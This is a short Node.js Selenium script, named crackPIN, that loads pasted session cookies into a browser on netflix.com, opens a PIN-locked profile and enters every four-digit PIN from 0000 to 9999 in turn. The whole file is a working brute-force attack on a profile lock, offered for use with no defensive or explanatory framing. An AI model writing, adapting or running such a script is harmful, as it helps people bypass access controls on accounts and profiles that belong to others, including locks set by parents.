const { Builder, By, Key, until } = require('selenium-webdriver');
const fsPromises = require('fs').promises;
const { promisify } = require('util');
const sleep = promisify(setTimeout);
const fs = require('fs');

const cookieString = ``;

async function crackPIN() {
    // Copy cookies json and paste here;
    const cookieData = JSON.parse(cookieString);

    const driver = await new Builder().forBrowser('chrome').build();

    try {
        await driver.get('https://www.netflix.com/');
        await driver.manage().deleteAllCookies();
        for (const cookie of cookieData) {
            await driver.manage().addCookie(cookie);
        }
        driver.navigate().refresh();

        // Copy full XPath of User Locked;
        const clickUserLock = await driver.findElement(By.xpath('/html/body/div[1]/div/div/div[1]/div[1]/div[2]/div/div/ul/li[4]/div/a/div/div'))
        await clickUserLock.click();

        const inputFields = [];
        for (let i = 1; i <= 4; i++) {
            // Change XPath of Pin if it change in the future;
            const xpath = `/html/body/div[1]/div/div/div[1]/div[1]/div[2]/div/div[3]/div/input[${i}]`;
            const inputField = await driver.findElement(By.xpath(xpath));
            inputFields.push(inputField);
        }

        for (let number = 0; number <= 9999; number++) {
            const formattedNumber = String(number).padStart(4, '0');

            // Log the current number
            console.log(formattedNumber);

            // Enter each digit into the corresponding input field
            for (let i = 0; i < 4; i++) {
                await inputFields[i].sendKeys(formattedNumber[i]);
            }

            // Add a brief pause (adjust as needed)
            await driver.sleep(500);
        }

        await sleep(5000);
    } finally {
        await driver.quit();
    }
}
crackPIN();